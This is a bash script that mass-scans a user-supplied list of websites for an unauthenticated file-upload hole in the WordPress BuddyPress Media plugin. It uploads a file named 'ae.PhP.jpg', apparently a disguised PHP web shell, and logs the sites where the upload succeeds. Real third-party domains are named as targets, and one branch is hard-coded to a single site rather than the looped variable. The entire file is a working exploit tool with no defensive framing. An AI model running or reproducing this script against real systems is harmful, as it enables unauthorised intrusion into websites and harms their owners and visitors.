#!/bin/bash
#http://madridesevilla.com/wp-content/plugins/buddypress-media/app/helper/rtUploadAttachment.php
check(){
   
   if [[ $(curl --silent -F 'userfile=@ae.PhP.jpg' $site/wp-content/plugins/buddypress-media/app/helper/rtUploadAttachment.php | grep -o 'ae.PhP.jpg') =~ 'ae.PhP.jpg' ]];
   then
   echo "$site/wp-content/uploads/rtMedia/tmp/ae.PhP.jpg" | tee -a result.txt
   elif [[ $(curl --silent -F 'Filedata=@ae.PhP.jpg' http://stade-montpied.com/wp-content/plugins/buddypress-media/app/helper/rtUploadAttachment.php | grep -o 'ae.PhP.jpg') =~ 'ae.PhP.jpg' ]];
   then
   echo "$site/wp-content/uploads/rtMedia/tmp/ae.PhP.jpg" | tee -a result.txt
   else
   echo "$site not vuln"
   fi
 }
read -p "masukan list : " list 
for site in $(cat $list); do
      echo "[try] $site"
      check $site 
     done
